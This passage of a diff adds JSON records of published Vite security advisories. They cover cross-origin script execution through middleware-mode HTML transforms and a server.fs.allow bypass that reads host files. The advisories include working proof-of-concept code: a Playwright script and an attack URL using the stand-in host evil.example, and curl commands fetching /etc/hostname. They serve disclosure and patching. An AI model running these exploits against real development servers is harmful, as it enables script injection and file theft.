+                                                               "type":  "User",
+                                                               "user_view_type":  "public",
+                                                               "site_admin":  false
+                                                           },
+                                                  "type":  "reporter",
+                                                  "state":  "accepted"
+                                              },
+                                              {
+                                                  "user":  {
+                                                               "login":  "bluwy",
+                                                               "id":  34116392,
+                                                               "node_id":  "MDQ6VXNlcjM0MTE2Mzky",
+                                                               "avatar_url":  "https://avatars.githubusercontent.com/u/34116392?v=4",
+                                                               "gravatar_id":  "",
+                                                               "url":  "https://api.github.com/users/bluwy",
+                                                               "html_url":  "https://github.com/bluwy",
+                                                               "followers_url":  "https://api.github.com/users/bluwy/followers",
+                                                               "following_url":  "https://api.github.com/users/bluwy/following{/other_user}",
+                                                               "gists_url":  "https://api.github.com/users/bluwy/gists{/gist_id}",
+                                                               "starred_url":  "https://api.github.com/users/bluwy/starred{/owner}{/repo}",
+                                                               "subscriptions_url":  "https://api.github.com/users/bluwy/subscriptions",
+                                                               "organizations_url":  "https://api.github.com/users/bluwy/orgs",
+                                                               "repos_url":  "https://api.github.com/users/bluwy/repos",
+                                                               "events_url":  "https://api.github.com/users/bluwy/events{/privacy}",
+                                                               "received_events_url":  "https://api.github.com/users/bluwy/received_events",
+                                                               "type":  "User",
+                                                               "user_view_type":  "public",
+                                                               "site_admin":  false
+                                                           },
+                                                  "type":  "remediation_reviewer",
+                                                  "state":  "accepted"
+                                              }
+                                          ],
+                     "collaborating_users":  null,
+                     "collaborating_teams":  null,
+                     "private_fork":  null,
+                     "comments":  2,
+                     "cvss":  {
+                                  "vector_string":  null,
+                                  "score":  null
+                              }
+                 },
+        "retrievedUtc":  "2026-11-16T14:30:46.9484606Z"
+    },
+    {
+        "status":  200,
+        "url":  "https://api.github.com/repos/vitejs/vite/security-advisories/GHSA-9jrq-w75r-8gcw",
+        "data":  {
+                     "ghsa_id":  "GHSA-9jrq-w75r-8gcw",
+                     "cve_id":  "CVE-2026-112945",
+                     "url":  "https://api.github.com/repos/vitejs/vite/security-advisories/GHSA-9jrq-w75r-8gcw",
+                     "html_url":  "https://github.com/vitejs/vite/security/advisories/GHSA-9jrq-w75r-8gcw",
+                     "summary":  "Cross origin script execution through Vite custom middleware",
+                     "description":  "### Summary\r\n\r\nWhen accessing a malicious site while a dev server using Vite is running, that site was able to load scripts in a page served by the dev server.\r\n\r\n### Impact\r\n\r\nOnly apps that match the following conditions are affected:\r\n\r\n- the dev server passes an unchanged browser request URL to `server.transformIndexHtml`: this is normally used for `server.middlewareMode: true` or `appType: \u0027custom\u0027`. The internal call for `appType: \u0027spa\u0027` and `appType: \u0027mpa\u0027` does not match this.\r\n- the transformed HTML contains an inline module script\r\n- from the script in the page served by the dev server, the app stores sensitive values in the location accessible or allows critical actions\r\n\r\n### Details\r\n\r\n[Vite\u0027s SSR guide for 8.2.1](https://github.com/vitejs/vite/blob/421615865dad3ed39137d17281814fc78a41246c/docs/guide/ssr.md#L119-L131) documents the affected setup. The application embeds Vite in middleware mode, reads trusted HTML, and passes the browser\u0027s unchanged request URL to the transform:\r\n\r\n```js\r\nconst url = req.originalUrl\r\ntemplate = await vite.transformIndexHtml(url, template)\r\n```\r\n\r\nFor a development server at `http://localhost:5173`, an attacker can send this URL:\r\n\r\n```text\r\nhttp://localhost:5173//evil.example/payload.js?/../../package.json\r\n```\r\n\r\nIn Vite 8.2.1, [`createDevHtmlTransformFn` and `getHtmlFilename` in `indexHtml.ts`](https://github.com/vitejs/vite/blob/421615865dad3ed39137d17281814fc78a41246c/packages/vite/src/node/server/middlewares/indexHtml.ts#L99-L115) use the request URL as both the transform `path` and the input to `path.join`. The value passed to `path.join` still includes its query text.\r\n\r\nChromium preserves `/../../package.json` because it follows `?` and is therefore query text. Vite treats the same characters as filesystem path components, so the `..` components resolve the derived filename to the existing project `package.json`.\r\n\r\n[The existing file branch in `indexHtml.ts`](https://github.com/vitejs/vite/blob/421615865dad3ed39137d17281814fc78a41246c/packages/vite/src/node/server/middlewares/indexHtml.ts#L216-L232) checks that filename with `fs.existsSync`, then preserves the `htmlPath` supplied by the attacker as `proxyModuleUrl`. [The inline module rewrite in the same file](https://github.com/vitejs/vite/blob/421615865dad3ed39137d17281814fc78a41246c/packages/vite/src/node/server/middlewares/indexHtml.ts#L271-L278) writes that value into the generated `src`:\r\n\r\n```html\r\n\u003cscript type=\"module\" src=\"//evil.example/payload.js?/../../package.json?html-proxy\u0026index=0.js\"\u003e\u003c/script\u003e\r\n```\r\n\r\nThe generated value is a valid URL. Its leading `//` tells the browser to request the module from `evil.example` using the Vite page\u0027s scheme. The attacker returns JavaScript for that request, and Chromium executes it in the Vite page.\r\n\r\n### PoC\r\n\r\n```js\r\nimport { createServer as createHttpServer } from \u0027node:http\u0027\r\nimport { createRequire } from \u0027node:module\u0027\r\nimport { dirname, join } from \u0027node:path\u0027\r\nimport { fileURLToPath, pathToFileURL } from \u0027node:url\u0027\r\n\r\nconst directory = dirname(fileURLToPath(import.meta.url))\r\nconst require = createRequire(join(directory, \u0027package.json\u0027))\r\nconst { chromium } = require(\u0027playwright-chromium\u0027)\r\nconst viteModule = await import(\r\n  pathToFileURL(require.resolve(\u0027vite\u0027)).href\r\n)\r\nconst createViteServer =\r\n  viteModule.createServer ?? viteModule.default.createServer\r\n\r\n// This loopback server stands in for a separately hosted attacker website.\r\nconst attackerPort = 4173\r\nconst exploitPath = `//127.0.0.1:${attackerPort}/payload.js?/../../package.json`\r\nconst html = \u0027\u003cscript type=\"module\"\u003edocument.body.textContent = \"Vite app\"\u003c/script\u003e\u0027\r\n\r\nconst listen = (server, port = 0) =\u003e\r\n  new Promise((resolve, reject) =\u003e {\r\n    server.once(\u0027error\u0027, reject)\r\n    server.listen(port, \u0027127.0.0.1\u0027, () =\u003e {\r\n      server.off(\u0027error\u0027, reject)\r\n      resolve(server.address().port)\r\n    })\r\n  })\r\n\r\nconst close = (server) =\u003e\r\n  new Promise((resolve, reject) =\u003e {\r\n    server.close((error) =\u003e (error ? reject(error) : resolve()))\r\n  })\r\n\r\nlet attackerRequest = null\r\nconst attacker = createHttpServer((request, response) =\u003e {\r\n  attackerRequest = request.url\r\n  response.writeHead(200, {\r\n    \u0027access-control-allow-origin\u0027: \u0027*\u0027,\r\n    \u0027content-type\u0027: \u0027text/javascript\u0027,\r\n  })\r\n  response.end(\r\n    \"document.documentElement.dataset.viteXssPoc = \u0027executed\u0027\",\r\n  )\r\n})\r\n\r\nconst vite = await createViteServer({\r\n  appType: \u0027custom\u0027,\r\n  configFile: false,\r\n  root: directory,\r\n  server: {\r\n    hmr: false,\r\n    middlewareMode: true,\r\n    watch: null,\r\n  },\r\n})\r\n\r\nconst application = createHttpServer((request, response) =\u003e {\r\n  vite.middlewares(request, response, async (error) =\u003e {\r\n    if (error) {\r\n      response.destroy(error)\r\n      return\r\n    }\r\n\r\n    try {\r\n      const transformed = await vite.transformIndexHtml(request.url, html)\r\n      response.writeHead(200, { \u0027content-type\u0027: \u0027text/html\u0027 })\r\n      response.end(transformed)\r\n    } catch (transformError) {\r\n      response.destroy(transformError)\r\n    }\r\n  })\r\n})\r\n\r\nawait listen(attacker, attackerPort)\r\nconst applicationPort = await listen(application)\r\nconst browser = await chromium.launch({ headless: true })\r\n\r\ntry {\r\n  const page = await browser.newPage()\r\n  await page.goto(`http://127.0.0.1:${applicationPort}${exploitPath}`)\r\n  await page.waitForFunction(\r\n    () =\u003e document.documentElement.dataset.viteXssPoc === \u0027executed\u0027,\r\n  )\r\n\r\n  console.log(`attacker request: ${attackerRequest}`)\r\n  console.log(\u0027JavaScript from the attacker server executed in the Vite page\u0027)\r\n} finally {\r\n  await browser.close()\r\n  await close(application)\r\n  await vite.close()\r\n  await close(attacker)\r\n}\r\n```\r\n\r\nObserved output on Vite 8.2.1:\r\n```text\r\nattacker request: /payload.js?/../../package.json?html-proxy\u0026index=0.js\r\nJavaScript from the attacker server executed in the Vite page\r\n```",
+                     "severity":  "low",
+                     "author":  null,
+                     "publisher":  {
+                                       "login":  "sapphi-red",
+                                       "id":  49056869,
+                                       "node_id":  "MDQ6VXNlcjQ5MDU2ODY5",
+                                       "avatar_url":  "https://avatars.githubusercontent.com/u/49056869?v=4",
+                                       "gravatar_id":  "",
+                                       "url":  "https://api.github.com/users/sapphi-red",
+                                       "html_url":  "https://github.com/sapphi-red",
+                                       "followers_url":  "https://api.github.com/users/sapphi-red/followers",
+                                       "following_url":  "https://api.github.com/users/sapphi-red/following{/other_user}",
+                                       "gists_url":  "https://api.github.com/users/sapphi-red/gists{/gist_id}",
+                                       "starred_url":  "https://api.github.com/users/sapphi-red/starred{/owner}{/repo}",
+                                       "subscriptions_url":  "https://api.github.com/users/sapphi-red/subscriptions",
+                                       "organizations_url":  "https://api.github.com/users/sapphi-red/orgs",
+                                       "repos_url":  "https://api.github.com/users/sapphi-red/repos",
+                                       "events_url":  "https://api.github.com/users/sapphi-red/events{/privacy}",
+                                       "received_events_url":  "https://api.github.com/users/sapphi-red/received_events",
+                                       "type":  "User",
+                                       "user_view_type":  "public",
+                                       "site_admin":  false
+                                   },
+                     "identifiers":  [
+                                         {
+                                             "value":  "GHSA-9jrq-w75r-8gcw",
+                                             "type":  "GHSA"
+                                         },
+                                         {
+                                             "value":  "CVE-2026-112945",
+                                             "type":  "CVE"
+                                         }
+                                     ],
+                     "state":  "published",
+                     "created_at":  null,
+                     "updated_at":  "2026-10-20T14:59:07Z",
+                     "published_at":  "2026-10-06T14:15:37Z",
+                     "closed_at":  null,
+                     "withdrawn_at":  null,
+                     "submission":  null,
+                     "vulnerabilities":  [
+                                             {
+                                                 "package":  {
+                                                                 "ecosystem":  "npm",
+                                                                 "name":  "vite"
+                                                             },
+                                                 "vulnerable_version_range":  "\u003e=8.3.0,\u003c=8.3.2",
+                                                 "patched_versions":  "8.3.3",
+                                                 "vulnerable_functions":  [
+
+                                                                          ]
+                                             },
+                                             {
+                                                 "package":  {
+                                                                 "ecosystem":  "npm",
+                                                                 "name":  "vite"
+                                                             },
+                                                 "vulnerable_version_range":  "\u003e=8.2.0,\u003c=8.2.3",
+                                                 "patched_versions":  "8.2.4",
+                                                 "vulnerable_functions":  [
+
+                                                                          ]
+                                             },
+                                             {
+                                                 "package":  {
+                                                                 "ecosystem":  "npm",
+                                                                 "name":  "vite"
+                                                             },
+                                                 "vulnerable_version_range":  "\u003e=8.0.0,\u003c=8.1.5",
+                                                 "patched_versions":  "8.1.6",
+                                                 "vulnerable_functions":  [
+
+                                                                          ]
+                                             },
+                                             {
+                                                 "package":  {
+                                                                 "ecosystem":  "npm",
+                                                                 "name":  "vite"
+                                                             },
+                                                 "vulnerable_version_range":  "\u003e=7.0.0,\u003c=7.3.6",
+                                                 "patched_versions":  "7.3.7",
+                                                 "vulnerable_functions":  [
+
+                                                                          ]
+                                             },
+                                             {
+                                                 "package":  {
+                                                                 "ecosystem":  "npm",
+                                                                 "name":  "vite"
+                                                             },
+                                                 "vulnerable_version_range":  "\u003c=6.4.3",
+                                                 "patched_versions":  "6.4.4",
+                                                 "vulnerable_functions":  [
+
+                                                                          ]
+                                             },
+                                             {
+                                                 "package":  {
+                                                                 "ecosystem":  "npm",
+                                                                 "name":  "vite-plus"
+                                                             },
+                                                 "vulnerable_version_range":  "\u003c=1.0.0",
+                                                 "patched_versions":  "1.1.0",
+                                                 "vulnerable_functions":  [
+
+                                                                          ]
+                                             }
+                                         ],
+                     "cvss_severities":  {
+                                             "cvss_v3":  {
+                                                             "vector_string":  null,
+                                                             "score":  null
+                                                         },
+                                             "cvss_v4":  {
+                                                             "vector_string":  "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:A/VC:L/VI:L/VA:N/SC:N/SI:N/SA:N",
+                                                             "score":  2.1
+                                                         }
+                                         },
+                     "cwes":  [
+                                  {
+                                      "cwe_id":  "CWE-80",
+                                      "name":  "Improper Neutralization of Script-Related HTML Tags in a Web Page"
+                                  }
+                              ],
+                     "cwe_ids":  [
+                                     "CWE-80"
+                                 ],
+                     "credits":  [
+                                     {
+                                         "login":  "deevashwer",
+                                         "type":  "reporter"
+                                     },
+                                     {
+                                         "login":  "bluwy",
+                                         "type":  "remediation_reviewer"
+                                     }
+                                 ],
+                     "credits_detailed":  [
+                                              {
+                                                  "user":  {
+                                                               "login":  "deevashwer",
+                                                               "id":  23222086,
+                                                               "node_id":  "MDQ6VXNlcjIzMjIyMDg2",
+                                                               "avatar_url":  "https://avatars.githubusercontent.com/u/23222086?v=4",
+                                                               "gravatar_id":  "",
+                                                               "url":  "https://api.github.com/users/deevashwer",
+                                                               "html_url":  "https://github.com/deevashwer",
+                                                               "followers_url":  "https://api.github.com/users/deevashwer/followers",
+                                                               "following_url":  "https://api.github.com/users/deevashwer/following{/other_user}",
+                                                               "gists_url":  "https://api.github.com/users/deevashwer/gists{/gist_id}",
+                                                               "starred_url":  "https://api.github.com/users/deevashwer/starred{/owner}{/repo}",
+                                                               "subscriptions_url":  "https://api.github.com/users/deevashwer/subscriptions",
+                                                               "organizations_url":  "https://api.github.com/users/deevashwer/orgs",
+                                                               "repos_url":  "https://api.github.com/users/deevashwer/repos",
+                                                               "events_url":  "https://api.github.com/users/deevashwer/events{/privacy}",
+                                                               "received_events_url":  "https://api.github.com/users/deevashwer/received_events",
+                                                               "type":  "User",
+                                                               "user_view_type":  "public",
+                                                               "site_admin":  false
+                                                           },
+                                                  "type":  "reporter",
+                                                  "state":  "accepted"
+                                              },
+                                              {
+                                                  "user":  {
+                                                               "login":  "bluwy",
+                                                               "id":  34116392,
+                                                               "node_id":  "MDQ6VXNlcjM0MTE2Mzky",
+                                                               "avatar_url":  "https://avatars.githubusercontent.com/u/34116392?v=4",
+                                                               "gravatar_id":  "",
+                                                               "url":  "https://api.github.com/users/bluwy",
+                                                               "html_url":  "https://github.com/bluwy",
+                                                               "followers_url":  "https://api.github.com/users/bluwy/followers",
+                                                               "following_url":  "https://api.github.com/users/bluwy/following{/other_user}",
+                                                               "gists_url":  "https://api.github.com/users/bluwy/gists{/gist_id}",
+                                                               "starred_url":  "https://api.github.com/users/bluwy/starred{/owner}{/repo}",
+                                                               "subscriptions_url":  "https://api.github.com/users/bluwy/subscriptions",
+                                                               "organizations_url":  "https://api.github.com/users/bluwy/orgs",
+                                                               "repos_url":  "https://api.github.com/users/bluwy/repos",
+                                                               "events_url":  "https://api.github.com/users/bluwy/events{/privacy}",
+                                                               "received_events_url":  "https://api.github.com/users/bluwy/received_events",
+                                                               "type":  "User",
+                                                               "user_view_type":  "public",
+                                                               "site_admin":  false
+                                                           },
+                                                  "type":  "remediation_reviewer",
+                                                  "state":  "accepted"
+                                              }
+                                          ],
+                     "collaborating_users":  null,
+                     "collaborating_teams":  null,
+                     "private_fork":  null,
+                     "comments":  4,
+                     "cvss":  {
+                                  "vector_string":  null,
+                                  "score":  null
+                              }
+                 },
+        "retrievedUtc":  "2026-11-16T14:30:47.3366755Z"
+    },
+    {
+        "status":  200,
+        "url":  "https://api.github.com/repos/vitejs/vite/security-advisories/GHSA-rq7h-c2jc-7f22",
+        "data":  {
+                     "ghsa_id":  "GHSA-rq7h-c2jc-7f22",
+                     "cve_id":  "CVE-2026-112946",
+                     "url":  "https://api.github.com/repos/vitejs/vite/security-advisories/GHSA-rq7h-c2jc-7f22",
+                     "html_url":  "https://github.com/vitejs/vite/security/advisories/GHSA-rq7h-c2jc-7f22",
+                     "summary":  "Files outside `server.fs.allow` could be served when project paths match system paths on non-Windows machine",
+                     "description":  "### Summary\r\n\r\nThe content of files outside `server.fs` setting can be returned to the browser if the project imports a file path concatenated with the `root`. For example, if the project references `\u003cpath-to-project-root\u003e/etc/hosts`, the content of `/etc/hosts` was possible to be returned.\r\n\r\nThe content of files outside the `server.fs.allow` option can be returned to the browser when a project imports a file whose root-relative path matches an absolute path on the host. For example, referencing `\u003cproject-root\u003e/etc/hosts` could make Vite return the host\u0027s `/etc/hosts` file.\r\n\r\n### Impact\r\n\r\nOnly apps that meet all of the following conditions are affected:\r\n\r\n- explicitly expose the Vite dev server to the network (using `--host` or the [`server.host` option](https://vite.dev/config/server-options#server-host))\r\n- contain an imported file whose root-relative browser URL is also the absolute path of a readable file on the host\r\n- The sensitive file is not matched by [`server.fs.deny`](https://vite.dev/config/server-options#server-fs-deny)\r\n- the dev server is not running on Windows\r\n\r\n### Details\r\n\r\nWhen Vite analyzes an in-root import, it rewrites the resolved module ID to a browser URL such as `/etc/hostname`. In affected versions, Vite converts that URL with `fsPathFromUrl` and adds the result to `safeModulePaths`. Because `fsPathFromUrl` ensures a leading slash without resolving the URL against the project root, the project URL `/etc/hostname` is recorded as if it were the absolute filesystem path `/etc/hostname`.\r\n\r\nFor a later request to `/@fs/etc/hostname`, the raw-filesystem middleware interprets `/etc/hostname` as an absolute path. The access check applies `server.fs.deny`, then accepts paths present in `safeModulePaths` before checking `server.fs.allow`. As a result, the request can return the host file instead of the project file that originally populated `safeModulePaths`.\r\n\r\n### PoC\r\nThe following example requires Linux with a readable `/etc/hostname`:\r\n```bash\r\n$ mkdir vite-safe-module-path-poc\r\n$ cd vite-safe-module-path-poc\r\n$ npm init -y\r\n$ npm install vite@8.3.1\r\n$ mkdir -p etc\r\n$ echo \u0027PROJECT-DECOY\\n\u0027 \u003e etc/hostname\r\n$ echo \u0027import \"./etc/hostname\"\\n\u0027 \u003e main.js\r\n$ npx vite --host 127.0.0.1\r\n```\r\n\r\nIn another terminal:\r\n```bash\r\n$ curl -o /dev/null -s -w \u0027%{http_code}\\n\u0027 http://127.0.0.1:5173/main.js\r\n200\r\n$ curl -sS -o response -w \u0027%{http_code}\\n\u0027 http://127.0.0.1:5173/@fs/etc/hostname\r\n200\r\n$ cmp -s response /etc/hostname \u0026\u0026 echo \u0027response matches host file\u0027\r\nresponse matches host file\r\n```",
+                     "severity":  "medium",
+                     "author":  null,
+                     "publisher":  {
+                                       "login":  "sapphi-red",
+                                       "id":  49056869,
+                                       "node_id":  "MDQ6VXNlcjQ5MDU2ODY5",
+                                       "avatar_url":  "https://avatars.githubusercontent.com/u/49056869?v=4",
+                                       "gravatar_id":  "",
+                                       "url":  "https://api.github.com/users/sapphi-red",
+                                       "html_url":  "https://github.com/sapphi-red",
+                                       "followers_url":  "https://api.github.com/users/sapphi-red/followers",
+                                       "following_url":  "https://api.github.com/users/sapphi-red/following{/other_user}",
+                                       "gists_url":  "https://api.github.com/users/sapphi-red/gists{/gist_id}",
+                                       "starred_url":  "https://api.github.com/users/sapphi-red/starred{/owner}{/repo}",
+                                       "subscriptions_url":  "https://api.github.com/users/sapphi-red/subscriptions",
+                                       "organizations_url":  "https://api.github.com/users/sapphi-red/orgs",
+                                       "repos_url":  "https://api.github.com/users/sapphi-red/repos",
+                                       "events_url":  "https://api.github.com/users/sapphi-red/events{/privacy}",
+                                       "received_events_url":  "https://api.github.com/users/sapphi-red/received_events",
+                                       "type":  "User",
+                                       "user_view_type":  "public",
+                                       "site_admin":  false
+                                   },
+                     "identifiers":  [
+                                         {
+                                             "value":  "GHSA-rq7h-c2jc-7f22",
+                                             "type":  "GHSA"
+                                         },
+                                         {
+                                             "value":  "CVE-2026-112946",
+                                             "type":  "CVE"
+                                         }
+                                     ],
+                     "state":  "published",
+                     "created_at":  null,
+                     "updated_at":  "2026-10-20T15:02:33Z",
+                     "published_at":  "2026-10-06T14:15:31Z",
+                     "closed_at":  null,
+                     "withdrawn_at":  null,
+                     "submission":  null,
+                     "vulnerabilities":  [
+                                             {
+                                                 "package":  {
+                                                                 "ecosystem":  "npm",
+                                                                 "name":  "vite"
+                                                             },
+                                                 "vulnerable_version_range":  "\u003e=8.3.0,\u003c=8.3.2",
+                                                 "patched_versions":  "8.3.3",
+                                                 "vulnerable_functions":  [
+
+                                                                          ]
+                                             },
+                                             {
+                                                 "package":  {
+                                                                 "ecosystem":  "npm",
+                                                                 "name":  "vite"
+                                                             },
+                                                 "vulnerable_version_range":  "\u003e=8.2.0,\u003c=8.2.3",
+                                                 "patched_versions":  "8.2.4",
+                                                 "vulnerable_functions":  [
+
+                                                                          ]
+                                             },
+                                             {
+                                                 "package":  {
+                                                                 "ecosystem":  "npm",
+                                                                 "name":  "vite"
+                                                             },
+                                                 "vulnerable_version_range":  "\u003e=8.0.0,\u003c=8.1.5",
+                                                 "patched_versions":  "8.1.6",
+                                                 "vulnerable_functions":  [
+
+                                                                          ]
+                                             },
+                                             {
+                                                 "package":  {
+                                                                 "ecosystem":  "npm",
+                                                                 "name":  "vite"
+                                                             },
+                                                 "vulnerable_version_range":  "\u003e=7.0.0,\u003c=7.3.6",
+                                                 "patched_versions":  "7.3.7",
+                                                 "vulnerable_functions":  [
+
+                                                                          ]
+                                             },
+                                             {
+                                                 "package":  {
+                                                                 "ecosystem":  "npm",
+                                                                 "name":  "vite"
+                                                             },
+                                                 "vulnerable_version_range":  "\u003c=6.4.3",
+                                                 "patched_versions":  "6.4.4",
+                                                 "vulnerable_functions":  [
+
+                                                                          ]
+                                             },
+                                             {
+                                                 "package":  {
+                                                                 "ecosystem":  "npm",
+                                                                 "name":  "vite-plus"
+                                                             },
+                                                 "vulnerable_version_range":  "\u003c=1.0.0",
+                                                 "patched_versions":  "1.1.0",
+                                                 "vulnerable_functions":  [
+
+                                                                          ]
+                                             }
+                                         ],
+                     "cvss_severities":  {
+                                             "cvss_v3":  {
+                                                             "vector_string":  null,
+                                                             "score":  null
+                                                         },
+                                             "cvss_v4":  {
+                                                             "vector_string":  "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N",
+                                                             "score":  6.3
+                                                         }
+                                         },
+                     "cwes":  [
+                                  {
+                                      "cwe_id":  "CWE-22",
+                                      "name":  "Improper Limitation of a Pathname to a Restricted Directory"
+                                  },
+                                  {
+                                      "cwe_id":  "CWE-284",
+                                      "name":  "Improper Access Control"
+                                  }
+                              ],
+                     "cwe_ids":  [
+                                     "CWE-22",
+                                     "CWE-284"
+                                 ],
+                     "credits":  [
+                                     {
+                                         "login":  "Kushalkhemka",
+                                         "type":  "finder"
+                                     },
+                                     {
+                                         "login":  "bluwy",
+                                         "type":  "remediation_reviewer"
+                                     },
+                                     {
+                                         "login":  "mayank-jangid-moon",
+                                         "type":  "finder"
+                                     },
+                                     {
+                                         "login":  "skigeek16",
+                                         "type":  "finder"
+                                     },
+                                     {
+                                         "login":  "opensec-intelligence",
+                                         "type":  "tool"
+                                     }
+                                 ],
+                     "credits_detailed":  [
+                                              {
+                                                  "user":  {
+                                                               "login":  "Kushalkhemka",
+                                                               "id":  72255307,
+                                                               "node_id":  "MDQ6VXNlcjcyMjU1MzA3",
+                                                               "avatar_url":  "https://avatars.githubusercontent.com/u/72255307?v=4",
+                                                               "gravatar_id":  "",
+                                                               "url":  "https://api.github.com/users/Kushalkhemka",
+                                                               "html_url":  "https://github.com/Kushalkhemka",
+                                                               "followers_url":  "https://api.github.com/users/Kushalkhemka/followers",
+                                                               "following_url":  "https://api.github.com/users/Kushalkhemka/following{/other_user}",
+                                                               "gists_url":  "https://api.github.com/users/Kushalkhemka/gists{/gist_id}",
+                                                               "starred_url":  "https://api.github.com/users/Kushalkhemka/starred{/owner}{/repo}",
+                                                               "subscriptions_url":  "https://api.github.com/users/Kushalkhemka/subscriptions",
+                                                               "organizations_url":  "https://api.github.com/users/Kushalkhemka/orgs",
+                                                               "repos_url":  "https://api.github.com/users/Kushalkhemka/repos",
+                                                               "events_url":  "https://api.github.com/users/Kushalkhemka/events{/privacy}",
+                                                               "received_events_url":  "https://api.github.com/users/Kushalkhemka/received_events",
+                                                               "type":  "User",
+                                                               "user_view_type":  "public",
+                                                               "site_admin":  false
+                                                           },
+                                                  "type":  "finder",
+                                                  "state":  "accepted"
+                                              },
+                                              {
+                                                  "user":  {
+                                                               "login":  "bluwy",
+                                                               "id":  34116392,
+                                                               "node_id":  "MDQ6VXNlcjM0MTE2Mzky",
+                                                               "avatar_url":  "https://avatars.githubusercontent.com/u/34116392?v=4",
+                                                               "gravatar_id":  "",
+                                                               "url":  "https://api.github.com/users/bluwy",
+                                                               "html_url":  "https://github.com/bluwy",
+                                                               "followers_url":  "https://api.github.com/users/bluwy/followers",
+                                                               "following_url":  "https://api.github.com/users/bluwy/following{/other_user}",
+                                                               "gists_url":  "https://api.github.com/users/bluwy/gists{/gist_id}",
+                                                               "starred_url":  "https://api.github.com/users/bluwy/starred{/owner}{/repo}",
+                                                               "subscriptions_url":  "https://api.github.com/users/bluwy/subscriptions",
+                                                               "organizations_url":  "https://api.github.com/users/bluwy/orgs",
+                                                               "repos_url":  "https://api.github.com/users/bluwy/repos",
+                                                               "events_url":  "https://api.github.com/users/bluwy/events{/privacy}",
+                                                               "received_events_url":  "https://api.github.com/users/bluwy/received_events",
+                                                               "type":  "User",
+                                                               "user_view_type":  "public",
+                                                               "site_admin":  false
+                                                           },
+                                                  "type":  "remediation_reviewer",
+                                                  "state":  "accepted"
+                                              },
+                                              {
+                                                  "user":  {
+                                                               "login":  "mayank-jangid-moon",
+                                                               "id":  175295782,
+                                                               "node_id":  "U_kgDOCnLNJg",
+                                                               "avatar_url":  "https://avatars.githubusercontent.com/u/175295782?v=4",
+                                                               "gravatar_id":  "",
+                                                               "url":  "https://api.github.com/users/mayank-jangid-moon",
+                                                               "html_url":  "https://github.com/mayank-jangid-moon",
+                                                               "followers_url":  "https://api.github.com/users/mayank-jangid-moon/followers",
+                                                               "following_url":  "https://api.github.com/users/mayank-jangid-moon/following{/other_user}",
+                                                               "gists_url":  "https://api.github.com/users/mayank-jangid-moon/gists{/gist_id}",
+                                                               "starred_url":  "https://api.github.com/users/mayank-jangid-moon/starred{/owner}{/repo}",
+                                                               "subscriptions_url":  "https://api.github.com/users/mayank-jangid-moon/subscriptions",
+                                                               "organizations_url":  "https://api.github.com/users/mayank-jangid-moon/orgs",
+                                                               "repos_url":  "https://api.github.com/users/mayank-jangid-moon/repos",
+                                                               "events_url":  "https://api.github.com/users/mayank-jangid-moon/events{/privacy}",
+                                                               "received_events_url":  "https://api.github.com/users/mayank-jangid-moon/received_events",
+                                                               "type":  "User",
+                                                               "user_view_type":  "public",
+                                                               "site_admin":  false
+                                                           },
+                                                  "type":  "finder",
+                                                  "state":  "accepted"
+                                              },
+                                              {
+                                                  "user":  {
+                                                               "login":  "skigeek16",
+                                                               "id":  177405396,
+                                                               "node_id":  "U_kgDOCpL91A",
+                                                               "avatar_url":  "https://avatars.githubusercontent.com/u/177405396?v=4",
+                                                               "gravatar_id":  "",
+                                                               "url":  "https://api.github.com/users/skigeek16",
+                                                               "html_url":  "https://github.com/skigeek16",
+                                                               "followers_url":  "https://api.github.com/users/skigeek16/followers",
+                                                               "following_url":  "https://api.github.com/users/skigeek16/following{/other_user}",
+                                                               "gists_url":  "https://api.github.com/users/skigeek16/gists{/gist_id}",
+                                                               "starred_url":  "https://api.github.com/users/skigeek16/starred{/owner}{/repo}",
+                                                               "subscriptions_url":  "https://api.github.com/users/skigeek16/subscriptions",
+                                                               "organizations_url":  "https://api.github.com/users/skigeek16/orgs",
+                                                               "repos_url":  "https://api.github.com/users/skigeek16/repos",
+                                                               "events_url":  "https://api.github.com/users/skigeek16/events{/privacy}",
+                                                               "received_events_url":  "https://api.github.com/users/skigeek16/received_events",
+                                                               "type":  "User",
+                                                               "user_view_type":  "public",
+                                                               "site_admin":  false
+                                                           },
+                                                  "type":  "finder",
+                                                  "state":  "accepted"
+                                              },
+                                              {
+                                                  "user":  {
+                                                               "login":  "opensec-intelligence",
+                                                               "id":  323596076,
+                                                               "node_id":  "U_kgDOE0mvLA",
+                                                               "avatar_url":  "https://avatars.githubusercontent.com/u/323596076?v=4",
+                                                               "gravatar_id":  "",
+                                                               "url":  "https://api.github.com/users/opensec-intelligence",
+                                                               "html_url":  "https://github.com/opensec-intelligence",
+                                                               "followers_url":  "https://api.github.com/users/opensec-intelligence/followers",
+                                                               "following_url":  "https://api.github.com/users/opensec-intelligence/following{/other_user}",
+                                                               "gists_url":  "https://api.github.com/users/opensec-intelligence/gists{/gist_id}",
+                                                               "starred_url":  "https://api.github.com/users/opensec-intelligence/starred{/owner}{/repo}",
+                                                               "subscriptions_url":  "https://api.github.com/users/opensec-intelligence/subscriptions",
+                                                               "organizations_url":  "https://api.github.com/users/opensec-intelligence/orgs",
+                                                               "repos_url":  "https://api.github.com/users/opensec-intelligence/repos",
+                                                               "events_url":  "https://api.github.com/users/opensec-intelligence/events{/privacy}",
+                                                               "received_events_url":  "https://api.github.com/users/opensec-intelligence/received_events",
+                                                               "type":  "User",
+                                                               "user_view_type":  "public",
+                                                               "site_admin":  false
+                                                           },
+                                                  "type":  "tool",
+                                                  "state":  "accepted"
+                                              }
+                                          ],
+                     "collaborating_users":  null,
+                     "collaborating_teams":  null,
+                     "private_fork":  null,
+                     "comments":  4,
+                     "cvss":  {
+                                  "vector_string":  null,
+                                  "score":  null
+                              }
+                 },
+        "retrievedUtc":  "2026-11-16T14:30:47.7243835Z"
+    },
+    {
+        "status":  200,
+        "url":  "https://api.github.com/repos/vitejs/vite/security-advisories/GHSA-vfpm-58rq-9qcg",
+        "data":  {
+                     "ghsa_id":  "GHSA-vfpm-58rq-9qcg",
+                     "cve_id":  "CVE-2026-112947",
+                     "url":  "https://api.github.com/repos/vitejs/vite/security-advisories/GHSA-vfpm-58rq-9qcg",
+                     "html_url":  "https://github.com/vitejs/vite/security/advisories/GHSA-vfpm-58rq-9qcg",
+                     "summary":  "First 4 bytes of files outside of `server.fs` setting is exposed by `?vite-wasm-instance`",
